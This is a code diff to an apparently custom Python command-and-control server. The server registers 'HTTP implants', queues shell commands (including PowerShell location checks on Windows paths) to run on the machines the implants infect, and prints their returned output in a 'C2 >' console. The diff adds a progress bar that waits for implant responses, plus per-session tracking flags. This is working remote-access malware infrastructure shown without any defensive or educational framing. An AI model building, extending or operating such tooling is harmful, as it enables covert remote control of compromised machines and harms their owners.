@@ -158,7 +158,7 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
         path = self.path.strip("/")
         with global_lock:
             if uid not in http_sessions:
-                http_sessions[uid] = {"last_cmd": "", "output": "", "last_seen": time.time(), "cwd": None}
+                http_sessions[uid] = {"last_cmd": "", "last_sent": "", "output": "", "last_seen": time.time(), "cwd": None, "has_new_output": False, "awaiting": False}
                 sys.stdout.write(f"\r[+] New HTTP implant registered: {uid}\nC2 > ")
                 sys.stdout.flush()
             http_sessions[uid]["last_seen"] = time.time()
@@ -200,18 +200,16 @@ class C2Handler(http.server.BaseHTTPRequestHandler):
             if uid in http_sessions:
                 http_sessions[uid]["output"] = decoded_output
                 http_sessions[uid]["last_seen"] = time.time()
-                if current_session == ('http', uid):
-                    clean = decoded_output.strip()
-                    last_sent = http_sessions[uid].get("last_sent", "")
-                    if "Get-Location" in last_sent or last_sent.strip().lower() == "pwd":
-                        lines = [ln for ln in clean.splitlines() if ln.strip()]
-                        if lines:
-                            candidate = lines[-1].strip()
-                            if re.match(r"^[A-Za-z]:\\", candidate) or candidate.startswith("\\") or candidate.startswith("/"):
-                                http_sessions[uid]["cwd"] = candidate
-                    if clean and clean != "OK":
-                        sys.stdout.write(f"\r{clean}\nC2 > ")
-                        sys.stdout.flush()
+                http_sessions[uid]["has_new_output"] = True
+                # Update CWD heuristics without printing immediately; console will print after progress bar
+                clean = decoded_output.strip()
+                last_sent = http_sessions[uid].get("last_sent", "")
+                if "Get-Location" in last_sent or last_sent.strip().lower() == "pwd":
+                    lines = [ln for ln in clean.splitlines() if ln.strip()]
+                    if lines:
+                        candidate = lines[-1].strip()
+                        if re.match(r"^[A-Za-z]:\\", candidate) or candidate.startswith("\\") or candidate.startswith("/"):
+                            http_sessions[uid]["cwd"] = candidate
 
         self._set_headers()
         self.wfile.write(b"OK")
@@ -388,6 +386,48 @@ def interactive_shell_session(shell_id: int):
         sys.stdout.flush()
 
 
+def wait_for_http_response(uid: str, timeout_seconds: int = 15):
+    """Render a progress bar while waiting for an HTTP implant response, then print it.
+
+    The bar fills to 100% when the response arrives. If it takes longer than the
+    timeout, the bar holds at 99% until the response comes.
+    """
+    start_time = time.time()
+    bar_width = 30
+
+    while True:
+        with global_lock:
+            session = http_sessions.get(uid)
+            has = bool(session and session.get("has_new_output"))
+            output = session.get("output") if session else ""
+        if has:
+            percent = 100
+            filled = bar_width
+            bar = "#" * filled + "." * (bar_width - filled)
+            sys.stdout.write(f"\r[waiting] [{bar}] {percent}%\n")
+            sys.stdout.flush()
+            break
+        elapsed = time.time() - start_time
+        percent = min(99, int((elapsed / max(timeout_seconds, 1)) * 100))
+        filled = int((percent / 100) * bar_width)
+        bar = "#" * filled + "." * (bar_width - filled)
+        sys.stdout.write(f"\r[waiting] [{bar}] {percent}%")
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+    # Print the captured output after bar completes
+    clean = (output or "").strip()
+    if clean and clean != "OK":
+        sys.stdout.write(clean + "\n")
+    # Reset flags and repaint prompt
+    with global_lock:
+        if uid in http_sessions:
+            http_sessions[uid]["has_new_output"] = False
+            http_sessions[uid]["awaiting"] = False
+    sys.stdout.write("C2 > ")
+    sys.stdout.flush()
+
+
 def c2_console():
     global current_session
     list_map = {}
@@ -459,6 +499,7 @@ def c2_console():
 
             if current_session[0] == 'http':
                 uid = current_session[1]
+                needs_wait = False
                 with global_lock:
                     if uid in http_sessions:
                         if cmd_input.startswith("cd"):
@@ -480,13 +521,19 @@ def c2_console():
                                     else:
                                         new_dir = f"{current_cwd}{sep}{arg}"
                                 http_sessions[uid]['cwd'] = new_dir
+                                needs_wait = False
                         else:
                             cwd = http_sessions[uid].get('cwd')
                             to_send = f'cd "{cwd}"; {cmd_input}' if cwd else cmd_input
                             http_sessions[uid]['last_cmd'] = to_send
+                            http_sessions[uid]['has_new_output'] = False
+                            http_sessions[uid]['awaiting'] = True
+                            needs_wait = True
                     else:
                         print(f"[!] HTTP implant {uid} is no longer active.")
                         current_session = None
+                if needs_wait:
+                    wait_for_http_response(uid)
                 continue
 
         except KeyboardInterrupt:
